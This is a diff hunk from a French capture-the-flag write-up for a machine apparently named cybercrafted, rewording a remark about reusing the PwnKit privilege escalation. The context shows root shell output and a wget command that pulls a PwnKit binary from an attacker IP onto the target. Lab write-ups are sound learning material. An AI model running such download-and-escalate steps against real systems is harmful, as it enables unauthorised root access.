@@ -274,7 +274,7 @@ uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
 Le flag ce trouve dans **/root/root.txt**
 
 # CHEAT MOD
-Décidement, cette vulnérabilité je l'aime d'amour, elle fonctionne partout !!
+Comme d'hab, cette CVE étant récente par rapport au VM, ben elle fonctionne aussi !!
 ```
 www-data@cybercrafted:/tmp$ wget 10.14.59.209/PwnKit
 --2023-12-04 15:26:47--  http://10.14.59.209/PwnKit
